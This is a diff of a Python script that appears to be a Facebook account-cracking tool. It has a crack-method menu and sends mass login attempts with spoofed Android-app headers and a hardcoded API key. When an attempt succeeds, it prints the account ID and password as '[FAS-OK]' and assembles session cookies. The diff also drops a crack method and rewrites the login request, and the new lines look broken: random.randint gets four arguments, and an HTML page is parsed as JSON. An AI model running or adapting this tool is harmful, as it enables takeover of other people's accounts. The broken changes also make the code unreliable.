@@ -77,10 +77,6 @@ F = '\x1b[38;5;48m'
 Z = '\033[1;33m'
 head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
 logo =                                          """            
-
-                                                                                          
-                                                                                          
-
 ███████╗██╗██████╗  ██████╗ ███████╗
 ██╔════╝██║██╔══██╗██╔═══██╗╚══███╔╝
 █████╗  ██║██████╔╝██║   ██║  ███╔╝ 
@@ -151,8 +147,6 @@ def method_crack():
     clear()
     print(f'[1] Method {1}')
     print(f'[2] Method {2}')
-    print(f'[3] Method {3}')
-    #print(f'[4] Method {4}')
     print(f'[0] Back')
     print('')
     option = input('Select method>: ')
@@ -161,9 +155,6 @@ def method_crack():
         main_crack().crack(id)
     elif option =='2':
         methods.append('methodB')
-        main_crack().crack(id)
-    elif option =='3':
-        methods.append('methodC')
         main_crack().crack(id)
    # elif option =='4':
     #    methods.append('methodD')
@@ -231,8 +222,8 @@ class main_crack():
                 headers = {'User-Agent': randBuildvsskj(),
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
-'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+'X-FB-Net-HNI': str(random.randint(5000, 10000, 20000, 40000)),
+'X-FB-SIM-HNI': str(random.randint(5000, 10000, 20000, 40000)),
 'X-FB-Connection-Type': 'MOBILE.LTE',
 'X-Tigon-Is-Retry': 'False',
 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
@@ -294,22 +285,11 @@ class main_crack():
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': randBuildLSB(),
-'Content-Type': 'application/x-www-form-urlencoded',
-'Host': 'graph.facebook.com',
-'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-'X-FB-Connection-Type': 'MOBILE.LTE',
-'X-Tigon-Is-Retry': 'False',
-'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-'x-fb-device-group': '5120',
-'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-'X-FB-Request-Analytics-Tags': 'graphservice',
-'X-FB-HTTP-Engine': 'Liger',
-'X-FB-Client-IP': 'True',
-'X-FB-Server-Cluster': 'True',
-'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
-                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+                headers = {'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6',
+    'cache-control': 'max-age=0',}
+                q = session.post('https://mbasic.facebook.com/',data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);FASb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={FASb};{ckkk}"
                     print(f"\r{R} [FAS-OK] {sid} | {ps} {S}")
